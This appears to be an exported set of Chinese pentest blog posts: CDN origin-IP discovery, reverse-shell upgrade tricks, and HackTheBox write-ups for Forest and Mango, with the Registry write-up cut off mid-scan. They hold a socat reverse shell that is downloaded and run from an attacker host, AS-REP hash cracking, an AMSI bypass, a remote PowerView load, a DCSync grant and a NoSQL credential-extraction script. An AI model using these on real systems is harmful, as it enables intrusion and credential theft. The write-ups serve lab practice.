\nhttps://dnsdb.io/\nhttps://sitereport.netcraft.com/?url=\nhttps://www.dnsqueries.com/en/domain_check.php\nhttps://dnsdumpster.com/\n\n子&#x2F;父名查询CDN服务是收费服务，对于资产较多的大型企业或组织来说，可能不会给所有域名都使用CDN。因此可以搜集子&#x2F;父域名信息，通过子&#x2F;父域名IP尝试找到源IP。并且通常大型组织的多个资产会分布在一个C段，可以以此作为确认参考。\n子域名信息可以使用常见子域名爆破工具，如：OneForAll。\n常见在线子域名查询工具如下：\n\nSecurityTrails\nhttps://dnsdb.io/zh-cn/\n\nSSL证书查询通常接入CDN要求服务器支持SSL并具有证书，SSL&#x2F;TLS证书通常包含域名、子域名和电子邮件地址。而通过访问IP的443端口可以直接看到证书信息，如果全网扫描IP记录网站证书，则可以对比证书信息找到目标站点。\nCensys实现了对整个互联网IP的扫描和证书探测，并记录到数据库中，我们可以通过该网站查询具有相同证书的站点尝试目标网站的真实IP。使用Censys，在输入框中选择Certificates，搜索目标域名，可以看到与目标域名对应的相关资产列表。单击右侧的Explore &#x3D;&gt; What&#39;s using this certificate?  &#x3D;&gt; IPv4 Hosts。其他语法：\n查找所有目标站点是该https证书的站点\n443.https.tls.certificate.parsed.extensions.subject_alt_name.dns_names:www.xxx.com\n\n匹配服务器标头\n80.http.get.headers.server:cloudflare\n\nSSRF漏洞如果目标网站存在SSRF漏洞，可以让目标网站主动发起请求从而泄露真实IP。\n邮件头信息如果网站具有邮箱注册、邮箱找回密码、RSS邮件订阅等功能场景，可以尝试让网站给自己发送邮件，从邮件头信息中获取到网站的真实IP。\n网络空间安全引擎搜索可以使用Fofa、Shodan、Zoomeye搜索，查找扫描收录的域名IP信息\n国外主机解析域名CDN全球加速和国内加速价格差别较大，一些只有国内业务的企业可能不会买全球加速，因此通过海外的站点进行ping测试或DNS解析，有可能找到真实ip。\n大部分 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的DNS查询，很可能获取到真实IP。\nhttps://dnscheck.pingdom.com/\n\nF5 BIG-IP LTM CookieF5负载均衡产品（ BIG-IP LTM）在做负载均衡时，会利用持久性Cookie来实现会话保持，Cookie包含了经过编码处理的目标服务器IP和端口信息。当服务器使用F5负载均衡产品做时，可以通过转换Cookie的相关参数获取到目标IP。方法参考：How To Decode BIG IP F5 Persistence Cookie Values和通过F5 BIG-IP LTM的会话Cookie获取Facebook服务器内网IP\nBIGipServer&lt;pool_name&gt;=vi20010112000000000000000000000030.20480\n\n相关工具在线工具\n\nhttp://www.cdnplanet.com/tools/cdnfinder/\nhttps://www.ipip.net/ip.html\nhttps://www.cdnplanet.com/tools/cdnfinder/\nhttps://www.cdnperf.com/tools/cdn-latency-benchmark\nhttps://securitytrails.com/\n\n其他搜集的工具\n\nCloudsnare.py：censys证书信息（需要API密钥）\nHatCloud：crimeflare、ipinfo.io\nCrimeFlare：crimeflare、ipinfo.io\nbypass-firewalls-by-DNS-history：securitytrails、crimeflare\nCloudFail：dnsdumpster、crimeflare、子域名暴力破解\nCloudFlair：需要censys API密钥\nCloudIP：通过nslookup查询某些子域名（如ftp、cpanel、mail、direct、direct-connect、webmail、portal等）\n\n参考https://blog.csdn.net/systemino/article/details/98188213\nhttps://www.cnblogs.com/qiudabai/p/9763739.html\nhttps://zhuanlan.zhihu.com/p/33440472\nhttps://www.secpulse.com/archives/136219.html\n","categories":["攻防渗透"],"tags":["CDN","WAF"]},{"title":"获取全交互式Shell","url":"/2019/12/%E8%8E%B7%E5%8F%96%E5%85%A8%E4%BA%A4%E4%BA%92%E5%BC%8Fshell/","content":"前言有时候在渗透过程中获取了简单的反弹shell，但是功能上没有全交互式shell强大，如：\n\n无法使用su、ssh等交互式命令\n无法使用vim等编辑器\n不能向上翻阅命令历史记录\n不能使用TAB键不全\n……\n\n下面是一些把Shell升级到全交互式Shell的方法\nReverse shell参考Linux反弹shell。如果目标系统上未安装一些必须的工具，可以在这里下载已编译的相关版本。\nsocat\nkali（10.0.3.4）监听：\nsocat file:`tty`,raw,echo=0 tcp-listen:4444 \n\n受害者执行：\nsocat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:192.168.1.100:4444 \n\n使用命令注入漏洞，可以将正确的架构的socat二进制文件下载到可写的目录，添加权限，然后在一行中执行命令获得反向shell：\nwget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:&#x27;bash -li&#x27;,pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444  \n\n\n\nawkawk &#x27;BEGIN&#123;system(&quot;/bin/bash&quot;)&#125;&#x27;\n\n\n\nPythonpython -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;python -c &#x27;__import__(&quot;pty&quot;).spawn(&quot;/bin/bash&quot;)&#x27;python -c &quot;import os;os.system(&#x27;/bin/bash&#x27;)&quot;\n\n无python时：\nexpect -c &#x27;spawn bash;interact&#x27;\n\n\n\nperlperl -e &quot;exec &#x27;/bin/sh&#x27;;&quot;\n\n\n\nvim输入vim，然后输入:!/bin/sh\n\n\n\n使用有样式的shell1.先到本地执行命令查看终端环境的一些信息：echo $TERM、stty -a。\n$ echo $TERMxterm-256color$ stty -a      #(stty size命令也能查看终端行数和列数)speed 38400 baud; rows 25; columns 90; line = 0;xxxxx\n\n可以看到本地终端颜色为xterm-256color，终端的高度宽度分别为25、90。\n2.在反弹shell中执行下面的命令，然后按下Ctrl+Z组合键，使反向shell进入后台运行。\npython -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;\n\n3.然后在本地中对终端中进行一些设置\n# 在本地shell中$ stty raw -echo$ fg# stty raw -echo fg# 在反弹shell中$ reset$ export SHELL=bash$ export TERM=xterm-256color$ stty rows 25 columns 90\t\n\nps：设置rows和columns是为了解决遇到shell 的高度&#x2F;宽度与终端不匹配的问题。\n完整按键操作：\npython -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;CTRL-Zstty raw -echofgENTER# pwnable.kr举例python -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;CTRL-Zstty raw -echo(cat payload &amp;&amp; cat) | nc pwnable.kr 9000\t\t#向目标发送payload并获得交互式shell\n\n\n\nSpawning A TTY Shellpython -c &#x27;import pty;pty.spawn(&quot;/bin/sh&quot;)&#x27;echo os.system(&#x27;/bin/bash&#x27;)/bin/sh -iperl —e &#x27;exec &quot;/bin/sh&quot;;&#x27;perl: exec &quot;/bin/sh&quot;;ruby: exec &quot;/bin/sh&quot;lua: os.execute(&#x27;/bin/sh&#x27;)# From within IRBexec &quot;/bin/sh&quot;# From within vi:!bash:set shell=/bin/bash:shell# From within nmap!sh# From scp：scp -S /path/yourscript x y:# AWK:awk &#x27;BEGIN &#123;system(&quot;/bin/sh or /bin/bash&quot;)&#125;&#x27;# find:find / -name test -exec /bin/sh or /bin/bash \\;# ssh:ssh username@IP – t &quot;/bin/sh&quot; or &quot;/bin/bash&quot;ssh username@IP -t &quot;bash –noprofile&quot;ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot; (shellshock)ssh -o ProxyCommand=&quot;sh -c /tmp/yourfile.sh&quot; 127.0.0.1 (SUID)git帮助状态下通过!/bin/bash进入交互式shellpico -s &quot;/bin/bash&quot;  进入编辑器写入/bin/bash 然后按 ctrl + T 键zip /tmp/test.zip /tmp/test -T –unzip-command=&quot;sh -c /bin/bash&quot;tar cf /dev/null testfile –checkpoint=1 –checkpointaction=exec=/bin/bash\n\n\n\n参考\n\nhttps://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/\nhttps://www.exploit-db.com/docs/english/44592-linux-restricted-shell-bypass-guide.pdf\nhttps://www.lshack.cn/653/\nhttps://xz.aliyun.com/t/2333\n\n","categories":["攻防渗透"],"tags":["kali","OSCP","ReverseShell"]},{"title":"HackTheBox-Forest","url":"/2020/07/hackthebox-forest/","content":"hackthebox- Froest （考点：Kerberos pre-authentication&#x2F;win-rm&amp;5985&#x2F;域渗透）\nhttps://blog.csdn.net/weixin_45527786/article/details/105558478\n扫描\n# nmap -T4 -sS -sV -sC 10.10.10.161Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-04 02:15 ESTNmap scan report for 10.10.10.161Host is up (0.28s latency).Not shown: 989 closed portsPORT     STATE SERVICE      VERSION53/tcp   open  domain?| fingerprint-strings: |   DNSVersionBindReqTCP: |     version|_    bind88/tcp   open  kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-04 07:23:52Z)135/tcp  open  msrpc        Microsoft Windows RPC139/tcp  open  netbios-ssn  Microsoft Windows netbios-ssn389/tcp  open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)445/tcp  open  microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)464/tcp  open  kpasswd5?593/tcp  open  ncacn_http   Microsoft Windows RPC over HTTP 1.0636/tcp  open  tcpwrapped3268/tcp open  ldap         Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)3269/tcp open  tcpwrapped1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port53-TCP:V=7.80%I=7%D=3/4%Time=5E5F559D%P=x86_64-pc-linux-gnu%r(DNSVeSF:rsionBindReqTCP,20,&quot;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\xSF:04bind\\0\\0\\x10\\0\\x03&quot;);Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h48m17s, deviation: 4h37m10s, median: 8m15s| smb-os-discovery: |   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)|   Computer name: FOREST|   NetBIOS computer name: FOREST\\x00|   Domain name: htb.local|   Forest name: htb.local|   FQDN: FOREST.htb.local|_  System time: 2020-03-03T23:26:20-08:00| smb-security-mode: |   account_used: guest|   authentication_level: user|   challenge_response: supported|_  message_signing: required| smb2-security-mode: |   2.02: |_    Message signing enabled and required| smb2-time: |   date: 2020-03-04T07:26:18|_  start_date: 2020-03-04T05:20:04Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 299.81 seconds\n\n\n\n看到139、445端口开启，说明Samba服务在运行。于是使用enum4linux尝试枚举主机用户。\n$ enum4linux -S -U 10.10.10.161...... =========================================== |    Getting domain SID for 10.10.10.161    | =========================================== Use of uninitialized value $global_workgroup in concatenation (.) or string at ./enum4linux.pl line 359.Domain Name: HTBDomain Sid: S-1-5-21-3072663084-364016917-1341370565[+] Host is part of a domain (not a workgroup)......user:[Administrator] rid:[0x1f4]user:[Guest] rid:[0x1f5]user:[krbtgt] rid:[0x1f6]user:[DefaultAccount] rid:[0x1f7]user:[$331000-VK4ADACQNUCA] rid:[0x463]user:[SM_2c8eef0a09b545acb] rid:[0x464]user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]user:[SM_75a538d3025e4db9a] rid:[0x466]user:[SM_681f53d4942840e18] rid:[0x467]user:[SM_1b41c9286325456bb] rid:[0x468]user:[SM_9b69f1b9d2cc45549] rid:[0x469]user:[SM_7c96b981967141ebb] rid:[0x46a]user:[SM_c75ee099d0a64c91b] rid:[0x46b]user:[SM_1ffab36a2f5f479cb] rid:[0x46c]user:[HealthMailboxc3d7722] rid:[0x46e]user:[HealthMailboxfc9daad] rid:[0x46f]user:[HealthMailboxc0a90c9] rid:[0x470]user:[HealthMailbox670628e] rid:[0x471]user:[HealthMailbox968e74d] rid:[0x472]user:[HealthMailbox6ded678] rid:[0x473]user:[HealthMailbox83d6781] rid:[0x474]user:[HealthMailboxfd87238] rid:[0x475]user:[HealthMailboxb01ac64] rid:[0x476]user:[HealthMailbox7108a4e] rid:[0x477]user:[HealthMailbox0659cc1] rid:[0x478]user:[sebastien] rid:[0x479]user:[lucinda] rid:[0x47a]user:[svc-alfresco] rid:[0x47b]user:[andy] rid:[0x47e]user:[mark] rid:[0x47f]user:[santi] rid:[0x480]\n\n可以看到域的名字为HTB。我们过滤出主机的用户名字典。\n$ enum4linux -U 10.10.10.161 | tee enum4linux.txt$ cat enum4linux.txt | grep &quot;user:&quot; | awk &#x27;&#123;split($0,a,&quot;[&quot; ); print a[2]&#125;&#x27; | awk &#x27;&#123;split($0,b,&quot;]&quot; ); print b[1]&#125;&#x27; &gt; userlist.txtcat users.txt | awk -F &quot;:&quot; &#x27;&#123;print $5&#125;&#x27; | awk -F &quot; &quot; &#x27;&#123;print $1&#125;&#x27; &gt; userlist.txt错误# https://markitzeroday.com/pci/active-directory/kerberoast/firewall/2019/04/24/gaining-access-to-card-data-using-the-windows-domain-to-bypass-firewalls.html$ enum4linux -R 1000-50000 10.0.12.100 |tee enum4linux.txt$ cat enum4linux.txt | grep &#x27;(Local User)&#x27; |awk &#x27;$2 ~ /MACFARLANE\\\\/ &#123;print $2&#125;&#x27;| grep -vP &#x27;^.*?\\$$&#x27; | sed &#x27;s/MACFARLANE\\\\//g&#x27;\n\n\n\n通过GetNPUsers.py找其中用户列表中不需要Kerberos预身份验证的用户，发现用户svc-alfresco并获得其hash。不加-format参数默认生成的是hashcat格式的。\n$ python GetNPUsers.py HTB/ -usersfile /root/userlist.txt -format john -dc-ip 10.10.10.161...[-] User sebastien doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User lucinda doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set$krb5asrep$svc-alfresco@HTB:32d83ad3aeac3898ec4fe24764a37f79$33a0e1816aa4bef47b40636df342ebd304358a005bb31deac95f8416e8ff635bdfe2a0a0c1917fe0940665cd1c0086f314b5bbe72e5a4d27d6490d08ba5681b26259877978107facdb7d55a499883bc0e814be1efdc244d34bb26d01e2c6079c104ecc4ddbb3f821fc995881cc520523bcf3a1f4e6f265058a336f93d3790a640b54ccf29ab6e4bb407c8941e245821795b2d4ff3a07d7f57e4ae440fed0878e5740f234d6f0917fab497c54c7cf0673b8909d1c9610d4696a446ae08041471a36fe94366ffa6e2d2bb9bf27b71ecd96622eafaf79ef93788cd175ce0c2458e0[-] User andy doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User mark doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User santi doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set[-] User ak47 doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set\n\n把hash保存成hash.txt\n$krb5asrep$svc-alfresco@HTB:32d83ad3aeac3898ec4fe24764a37f79$33a0e1816aa4bef47b40636df342ebd304358a005bb31deac95f8416e8ff635bdfe2a0a0c1917fe0940665cd1c0086f314b5bbe72e5a4d27d6490d08ba5681b26259877978107facdb7d55a499883bc0e814be1efdc244d34bb26d01e2c6079c104ecc4ddbb3f821fc995881cc520523bcf3a1f4e6f265058a336f93d3790a640b54ccf29ab6e4bb407c8941e245821795b2d4ff3a07d7f57e4ae440fed0878e5740f234d6f0917fab497c54c7cf0673b8909d1c9610d4696a446ae08041471a36fe94366ffa6e2d2bb9bf27b71ecd96622eafaf79ef93788cd175ce0c2458e0\n\n使用john解密，加载rockyou.txt字典。\nroot@localhost:~# john --wordlist=/usr/share/wordlists/rockyou.txt hash.txtUsing default input encoding: UTF-8Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])Press &#x27;q&#x27; or Ctrl-C to abort, almost any other key for statuss3rvice          ($krb5asrep$svc-alfresco@HTB)1g 0:00:00:11 DONE (2020-03-04 04:17) 0.08650g/s 353435p/s 353435c/s 353435C/s s3s1k2..s3rj12Use the &quot;--show&quot; option to display all of the cracked passwords reliablySession completedroot@localhost:~# john --show hash.txt $krb5asrep$svc-alfresco@HTB:s3rvice1 password hash cracked, 0 left\n\n\n\nhashcat破解：\nhttps://forum.hackthebox.eu/discussion/2749/getnpusers-py-explained-video\nhttps://markitzeroday.com/pci/active-directory/kerberoast/firewall/2019/04/24/gaining-access-to-card-data-using-the-windows-domain-to-bypass-firewalls.html\n然后使用Crackmapexec执行命令。\nevil-winrm\nhttps://vulners.com/kitploit/KITPLOIT:1521717899068290187\nsudo gem install winrm winrm-fs colorize stringiosudo gem install evil-winrmgit clone https://github.com/Hackplayers/evil-winrm.gitcd evil-winrmruby evil-winrm.rb -i 192.168.1.100 -u Administrator -p &#x27;MySuperSecr3tPass123!&#x27; -s &#x27;/home/foo/ps1_scripts/&#x27; -e &#x27;/home/foo/exe_files/&#x27;\n\n\n\n\n\n使用evil-winrm连接主机\n$ evil-winrm -i 192.168.1.100 -u &lt;Username&gt; -p &lt;Password&gt; -s &#x27;/home/foo/ps1_scripts/&#x27; -e &#x27;/home/foo/exe_files/&#x27;$ evil-winrm -i 10.10.10.161 -u svc-alfresco -p &quot;s3rvice&quot;Evil-WinRM shell v2.3Info: Establishing connection to remote endpoint*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; whoamihtb\\svc-alfresco*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; cd ../Desktop*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt; type user.txte5e4e47ae7022664cda6eb013fb0d9ed*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Desktop&gt;\n\n\n\n查询域中的工作组\nEvil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net group /domainGroup Accounts for \\\\-------------------------------------------------------------------------------*$D31000-NSEL5BRJ63V7*Cloneable Domain Controllers*Compliance Management*Delegated Setup*Discovery Management*DnsUpdateProxy*Domain Admins*Domain Computers*Domain Controllers*Domain Guests*Domain Users*Enterprise Admins*Enterprise Key Admins*Enterprise Read-only Domain Controllers*Exchange Servers*Exchange Trusted Subsystem*Exchange Windows Permissions*ExchangeLegacyInterop*Group Policy Creator Owners*Help Desk*Hygiene Management*Key Admins*Managed Availability Servers*Organization Management*Privileged IT Accounts*Protected Users*Public Folder Management*Read-only Domain Controllers*Recipient Management*Records Management*Schema Admins*Security Administrator*Security Reader*Server Management*Service Accounts*test*UM Management*View-Only Organization ManagementThe command completed with one or more errors.\n\n查看组信息时发现Exchange，尝试通过Exchange的默认高权限提权。\n参考：https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin/\n或者直接搜索CVE-2018-8581\n开始提权可以直接用svc-alfresco这个用户进行一系列给权限操作。不过我为了更好体验这些不同组的权限分工，来更熟悉域环境。我自己弄个新小弟用户走全程。我先自己增一个用户pkp，密码pkp666！，再加到域的exchange组里。bypass用来绕过我传powerview进来的限制。有了powerview的帮助我才能给自己加dscync的权限\nEvil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net user pkp pkp666! /add /domainThe command completed successfully.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net group &quot;Exchange Windows Permissions&quot; pkp /addThe command completed successfully.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; net localgroup &quot;Remote Management Users&quot; pkp /addThe command completed successfully.*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; menu   ,.   (   .      )               &quot;            ,.   (   .      )       .     (&quot;  (  )  )&#x27;     ,&#x27;             (`     &#x27;`    (&quot;     )  )&#x27;     ,&#x27;   .  ,)  .; )  &#x27; (( (&quot; )    ;(,      .     ;)  &quot;  )&quot;  .; )  &#x27; (( (&quot; )   );(,   )((   _&quot;.,_,.__).,) (.._( ._),     )  , (._..( &#x27;.._&quot;._, . &#x27;._)_(..,_(_&quot;.) _( _&#x27;)  \\_   _____/__  _|__|  |    ((  (  /  \\    /  \\__| ____\\______   \\  /     \\   |    __)_\\  \\/ /  |  |    ;_)_&#x27;) \\   \\/\\/   /  |/    \\|       _/ /  \\ /  \\  |        \\\\   /|  |  |__ /_____/  \\        /|  |   |  \\    |   \\/    Y    \\/_______  / \\_/ |__|____/           \\__/\\  / |__|___|  /____|_  /\\____|__  /        \\/                               \\/          \\/       \\/         \\/               By: CyberVaca, OscarAkaElvis, Laox @Hackplayers   [+] Bypass-4MSI [+] Dll-Loader [+] Donut-Loader [+] Invoke-Binary*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Bypass-4MSI[+] Patched! :D*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; IEX(New-Object Net.Webclient).downloadString(&#x27;http://10.10.14.3/PowerView.ps1&#x27;)*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $pass = convertto-securestring &#x27;pkp666!&#x27; -asplain -force*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; $cred = new-object system.management.automation.pscredential(&#x27;htb\\pkp&#x27;, $pass)*Evil-WinRM* PS C:\\Users\\svc-alfresco\\Documents&gt; Add-ObjectACL -PrincipalIdentity pkp -Credential $cred -Rights DCSync\n\n\n\n\n\n\n\nhttps://yaboygmoney.github.io/htb/forest.html\nhttps://mp.weixin.qq.com/s/VrRCxszh03ffAq531XNyKg\nhttps://markitzeroday.com/pci/active-directory/kerberoast/firewall/2019/04/24/gaining-access-to-card-data-using-the-windows-domain-to-bypass-firewalls.html\n","categories":["渗透靶场"],"tags":["HackTheBox"]},{"title":"HackTheBox-Mango","url":"/2020/07/hackthebox-mango/","content":"nmap扫描常见端口，发现开启了22、80、443。\n# nmap -T4 -sS -sV -sC 10.10.10.162Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-06 01:51 ESTNmap scan report for 10.10.10.162Host is up (0.25s latency).Not shown: 997 closed portsPORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 a8:8f:d9:6f:a6:e4:ee:56:e3:ef:54:54:6d:56:0c:f5 (RSA)|   256 6a:1c:ba:89:1e:b0:57:2f:fe:63:e1:61:72:89:b4:cf (ECDSA)|_  256 90:70:fb:6f:38:ae:dc:3b:0b:31:68:64:b0:4e:7d:c9 (ED25519)80/tcp  open  http     Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: 403 Forbidden443/tcp open  ssl/http Apache httpd 2.4.29 ((Ubuntu))|_http-server-header: Apache/2.4.29 (Ubuntu)|_http-title: Mango | Search Base| ssl-cert: Subject: commonName=staging-order.mango.htb/organizationName=Mango Prv Ltd./stateOrProvinceName=None/countryName=IN| Not valid before: 2019-09-27T14:21:19|_Not valid after:  2020-09-26T14:21:19|_ssl-date: TLS randomness does not represent time| tls-alpn: |_  http/1.1Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 31.07 seconds\n\n在nmap的443端口输出信息中看到staging-order.mango.htb，加到&#x2F;etc&#x2F;hosts中后访问\nNoSQL注入脚本：\n#!/usr/bin/env pythonimport requestsimport stringurl = &quot;http://staging-order.mango.htb/index.php&quot;headers = &#123;&quot;Host&quot;: &quot;staging-order.mango.htb&quot;&#125;cookies = &#123;&quot;PHPSESSID&quot;: &quot;icc5dp0dufeh68mctc9dlne8jd&quot;&#125;possible_chars = list(string.ascii_letters) + list(string.digits) + [&quot;\\\\&quot;+c for c in string.punctuation+string.whitespace ]def get_usernames():    usernames = []    params = &#123;        &quot;username[$regex]&quot;:&quot;&quot;,         &quot;password[$regex]&quot;:&quot;.*&quot;,         &quot;login&quot;: &quot;login&quot;    &#125;        for c in possible_chars:        username = &quot;^&quot; + c        params[&quot;username[$regex]&quot;] = username + &quot;.*&quot;                pr = requests.post(url,             data=params,             headers=headers,             cookies=cookies,             allow_redirects=False        )                if int(pr.status_code) == 302:            print(&quot;Found username starting with &quot;+c)            while True:                for c2 in possible_chars:                    params[&quot;username[$regex]&quot;] = username + c2 + &quot;.*&quot;                    if int(requests.post(url, data=params, headers=headers, cookies=cookies, allow_redirects=False).status_code) == 302:                        username += c2                        print(username)                        break                if c2 == possible_chars[-1]:                    print(&quot;Found username: &quot; +username[1:])                    usernames.append(username[1:])                    break    return usernamesfor u in get_usernames():    get_password(u)def get_password(username):    print(&quot;Extracting password of &quot; + username)    params = &#123;        &quot;username&quot;:username,        &quot;password[$regex]&quot;:&quot;&quot;,        &quot;login&quot;: &quot;login&quot;    &#125;    password = &quot;^&quot;    while True:        for c in possible_chars:            params[&quot;password[$regex]&quot;] = password + c + &quot;.*&quot;            pr = requests.post(url,             \tdata=params,            \theaders=headers,             \tcookies=cookies,             \tallow_redirects=False)            if int(pr.status_code) == 302:                password += c                break        if c == possible_chars[-1]:            print (&quot;Found password &quot;+password[1:].replace(&quot;\\\\&quot;, &quot;&quot;)+&quot; for username &quot;+username)            return password[1:].replace(&quot;\\\\&quot;, &quot;&quot;)\n\n\n\n总结NoSQL Injection\n参考https://mp.weixin.qq.com/s/ffHB9ZKWrUQuipWGPD0H5w\n","categories":["渗透靶场"],"tags":["HackTheBox"]},{"title":"HackTheBox入门","url":"/2020/03/hackthebox%E5%85%A5%E9%97%A8/","content":"注册账号注册链接：https://www.hackthebox.eu/invite\n右击查看源代码，发现js/inviteapi.min.js文件，js代码格式化之后：\nfunction verifyInviteCode(code) &#123;    var formData = &#123;        &quot;code&quot;: code    &#125;;    $.ajax(&#123;        type: &quot;POST&quot;,        dataType: &quot;json&quot;,        data: formData,        url: &#x27;/api/invite/verify&#x27;,        success: function(response) &#123;            console.log(response)        &#125;,        error: function(response) &#123;            console.log(response)        &#125;    &#125;)&#125;function makeInviteCode() &#123;    $.ajax(&#123;        type: &quot;POST&quot;,        dataType: &quot;json&quot;,        url: &#x27;/api/invite/how/to/generate&#x27;,        success: function(response) &#123;            console.log(response)        &#125;,        error: function(response) &#123;            console.log(response)        &#125;    &#125;)&#125;\n\n浏览器F12打开调试工具，在console中输入makeInviteCode()执行函数，响应包中得到一串ROT13或者Base64编码的数据，Base64解码之后内容如下：\nIn order to generate the invite code, make a POST request to /api/invite/generate\n\n对该页面https://www.hackthebox.eu/api/invite/generate发送POST请求，解码响应包中的Base64编码的数据即可获得邀请码。\ncurl -X POST https://www.hackthebox.eu/api/invite/generate\n\n\n\n注意，该网站需要挂代理访问。使用的终端或者工具也要挂代理。\n可以浏览器挂代理在调试工具的控制台中发送post请求。在浏览器控制台输入：\n$.post(&#x27;https://www.hackthebox.eu/api/invite/generate&#x27;,function(data)&#123;console.log(data)&#125;)\n\n返回结果\n&#123;0: 200, success: 1, data: &#123;code: &quot;UVpJVFItSlpLVU0tV1pXTVItUERTRVotS0RPVlg=&quot;, format: &quot;encoded&quot;&#125;&#125;\n\n这里和上面一样，把date的code部分解密就可以看到邀请码了。\n参考：https://www.cnblogs.com/zhuxiaoxi/p/10305940.html\n连接 VPN1.安装openvpn客户端kali\napt-get install network-manager-openvpn network-manager-openvpn-gnome network-manager-pptp network-manager-pptp-gnome network-manager-strongswan network-manager-vpnc network-manager-vpnc-gnome\n\nMacOS\nbrew install openvpn\n\nGUI客户端工具\n\nWindows：待续\nLinux：待续\nMacos：Shimo\n\n2.下载openvpn配置文件访问hackthebox靶机需要连接指定vpn。访问https://www.hackthebox.eu/home/htb/access，在`Connection pack处点击here&#96;下载openvpn配置文件，切换到root用户，连接vpn命令：\nopenvpn xxx.ovpn\n\n当终端提示以下内容时，说明vpn已经连接。连接成功后在access页面可以看到Connected的状态已打勾：\nInitialization Sequence Completed\n\n\n\n3.Kali使用VPN客户端连接（推荐）安装openvpn-gnome后，可以用GUI工具直接导入配置文件。\nhttps://support.ipvanish.com/hc/en-us/articles/360002787473-How-to-Configure-OpenVPN-in-Kali-Linux-\n开始实验成功连接VPN后，在左侧选择Machines选项下的Machine选项，查看可以进行实验练习的主机。\nretired选项下的主机是比较早的靶机，会员才能访问以前的实验。\n练习\nhttps://www.bus123.net/10123.html\n","categories":["渗透靶场"],"tags":["HackTheBox"]},{"title":"HackTheBox-Registry","url":"/2020/03/hackthebox-registry/","content":"nmap扫描常见短裤，发现开启了22、80、443。\n# nmap -T4 -sS -sV -sC 10.10.10.159Starting Nmap 7.80 ( https://nmap.org ) at 2020-03-05 21:49 ESTNmap scan report for 10.10.10.159Host is up (0.29s latency).Not shown: 997 closed portsPORT    STATE SERVICE  VERSION22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: |   2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA)|   256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA)|_  256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519)80/tcp  open  http     nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: Welcome to nginx!443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)|_http-server-header: nginx/1.14.0 (Ubuntu)|_http-title: 400 The plain HTTP request was sent to HTTPS port| ssl-cert: Subject: commonName=docker.registry.htb| Not valid before: 2019-05-06T21:14:35|_Not valid after:  2029-05-03T21:14:35Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at https://nmap.org/submit/ .Nmap done: 1 IP address (1 host up) scanned in 108.43 